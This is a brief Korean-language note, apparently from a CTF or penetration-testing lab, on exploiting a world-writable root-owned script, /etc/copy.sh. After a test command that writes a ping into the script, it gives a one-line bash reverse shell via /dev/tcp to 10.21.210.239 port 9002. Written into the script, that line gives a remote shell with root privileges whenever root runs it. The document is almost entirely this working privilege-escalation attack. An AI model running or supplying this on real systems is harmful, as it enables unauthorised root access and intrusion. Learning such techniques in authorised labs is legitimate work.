

```bash
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

이렇게 생겨먹은 root 권한의 파일 내용 수정하는 방법



```bash
echo 'ping -c 1 10.21.210.239' > /etc/copy.sh
```


```bash title="reverse shell"
echo "bash -c 'exec bash -i &> /dev/tcp/10.21.210.239/9002 <&1'" > /etc/copy.sh
```

